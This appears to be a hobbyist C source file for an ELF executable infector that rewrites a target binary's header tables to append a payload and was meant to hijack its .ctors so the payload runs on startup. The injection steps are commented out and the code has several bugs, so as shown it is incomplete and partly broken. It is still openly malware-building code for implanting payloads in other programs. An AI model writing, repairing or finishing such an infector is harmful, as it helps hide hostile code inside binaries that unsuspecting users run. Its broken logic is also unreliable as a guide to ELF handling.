#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <elf.h>

//what kind of elfs are we dealinth with yo?
//yay polymorphism via macros!
#define ELFN(x) Elf64_ ## x

char usage[] = 
"usage: %s target payload result\n\
\n\
Note: payload must be in flat binary format.\n\
";

int main(int argc, char *argv[]){
  if( argc != 4 ){
    printf(usage, argv[0]);
    return 1;
  }

  void *target;
  off_t targetSize;
  void *payload;
  off_t payloadSize;
  int i;

  if( readFile(argv[1], &target, &targetSize) != 0 ){
    fprintf(stderr, "Could not open file '%s'\n", argv[1]);
    return -1;
  }
  if( readFile(argv[2], &payload, &payloadSize) != 0 ){
    fprintf(stderr, "Could not open file '%s'\n", argv[1]);
    return -1;
  }

  ELFN(Ehdr) *elfHeader = target;

  //allocate space for the new program header table and the payload
  off_t infectedSize = targetSize + payloadSize + (elfHeader->e_shnum*elfHeader->e_shentsize) + ((elfHeader->e_phnum+1)*elfHeader->e_phentsize);
  if( (target = realloc(target, infectedSize)) == 0 ){
    fprintf(stderr, "Unable to allocate memory for the infected binary.\nI hate my life.\n");
  }

  elfHeader = target;
  ELFN(Phdr) *programHeaderTable = target + elfHeader->e_phoff;
  ELFN(Shdr) *sectionHeaderTable = target + elfHeader->e_shoff;

  //find the string table
  ELFN(Shdr) *stringTable = sectionHeaderTable;
  i = 0;
  while( i < elfHeader->e_shnum
      && (stringTable->sh_type != SHT_STRTAB
      || strcmp(target + stringTable->sh_offset + stringTable->sh_name, ".shstrtab") != 0)
  ){
    stringTable++;
    i++;
  }
  if( i >= elfHeader->e_shnum ){
    fprintf(stderr, "Unable to locate the string table. Giving up...\n");
    return -1;
  }
  char* stringTableValues = target + stringTable->sh_offset;

  //find the program header containing the .text segment
  //it is likely the only LOAD with flags = RX
  ELFN(Phdr) * loadHeader = programHeaderTable;
  i = 0;
  while( i < elfHeader->e_phnum && loadHeader->p_type != PT_LOAD && loadHeader->p_flags != (PF_R | PF_X)){
    i++;
  }
  if( i >= elfHeader->e_phnum ){
    fprintf(stderr, "Unable to locate the .text segment. Is this an executable?\n");
    return -1;
  }

  //find the .ctors
  ELFN(Shdr) *ctors = sectionHeaderTable;
  i = 0;
  while(i < elfHeader->e_shnum && strcmp(stringTableValues + ctors->sh_name, ".ctors") != 0 ){
    ctors += sizeof(elfHeader->e_shentsize);
    i++;
  }
  if( strcmp(stringTableValues + ctors->sh_name, ".ctors") != 0 ){
    fprintf(stderr, "Unable to locate the .ctors table. LAME!\n");
    return -1;
  }

  //copy the program header to the end of the elf, and update the elf header to point to it.
  off_t programHeaderTableSize = (elfHeader->e_phnum+1)*elfHeader->e_phentsize;
  off_t sectionHeaderTableSize = elfHeader->e_shnum*elfHeader->e_shentsize;
  memcpy(target+targetSize, programHeaderTable, programHeaderTableSize);
  memcpy(target+infectedSize-sectionHeaderTableSize, sectionHeaderTable, sectionHeaderTableSize);
  elfHeader->e_phoff = targetSize;
  elfHeader->e_shoff = infectedSize-sectionHeaderTableSize;

  //add a new LOAD section that contains our payload to the program header
  //ELFN(Phdr) *payloadHeader = target + elfHeader->e_phoff + (elfHeader->e_phnum * elfHeader->e_phentsize);
  //payloadHeader->p_type = PT_LOAD;
  //payloadHeader->p_offset = (void*)payloadHeader - target + elfHeader->e_phentsize; //payload starts right after this header
  //payloadHeader->p_vaddr = loadHeader->p_vaddr + loadHeader->p_memsz; //load our payload into memory after the normal .text
  //payloadHeader->p_paddr = payloadHeader->p_vaddr;
  //payloadHeader->p_filesz = payloadSize;
  //payloadHeader->p_memsz = payloadSize;
  //payloadHeader->p_flags = PF_X | PF_R | PF_W;
  //payloadHeader->p_align = loadHeader->p_align;
  //elfHeader->e_phnum++;

  //copy over the payload
  //memcpy(target+payloadHeader->p_offset, payload, payloadSize);

  //update the ctors to point to our payload :D
  //*((ELFN(Addr)*)(target + ctors->sh_offset)) = payloadHeader->p_vaddr;
  //*((ELFN(Addr)*)(target + ctors->sh_offset)+1) = -1;

  //write out the newly infected file
  if( writeFile(argv[3], target, infectedSize) != 0){
    fprintf(stderr, "Could not save the infected file to '%s'. You got the perms?\n", argv[2]);
    return -1;
  }

  return 0;
}

//assigns buffer and size to the size and location on the heap of the files contents
//returns 0 on success, -1 on failure
int readFile(char *path, void **buffer, off_t *size){
  //get the file size
  struct stat fileInfo;
  if( stat(path, &fileInfo) != 0 ){
    return -1;
  }
  //allocate some space on the heap
  *size = fileInfo.st_size;
  if( (*buffer = malloc(fileInfo.st_size)) == 0){
    return -1;
  }
  //read in the file
  FILE *fp;
  if( (fp = fopen(path, "r")) == 0 ){
    free(*buffer);
    return -1;
  }
  fread(*buffer, 1, *size, fp);
  fclose(fp);

  return 0;
}

int writeFile(char *path, void *buffer, off_t size){
  FILE *fp;
  if( (fp = fopen(path, "w")) == 0 ){
    return -1;
  }
  fwrite(buffer, 1, size, fp);
  fclose(fp);
}

